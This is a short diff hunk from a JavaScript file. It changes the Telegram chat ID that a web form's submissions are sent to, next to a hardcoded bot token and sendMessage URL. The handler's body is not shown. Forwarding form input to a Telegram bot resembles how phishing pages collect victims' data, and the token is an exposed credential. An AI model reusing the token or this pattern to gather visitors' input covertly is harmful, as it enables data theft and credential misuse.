@@ -150,7 +150,7 @@ $(document).ready(function() {
 
 /* submit form */
 const token = "7928469961:AAHT1gppJpIZPZLltJkm_UQcnhvL5sjGw2o"
-const chat_id = "-4878197828"
+const chat_id = "-5120226520"
 const url = `https://api.telegram.org/bot${token}/sendMessage`
 
 document.getElementById("mainModal").addEventListener("submit", function (e) {
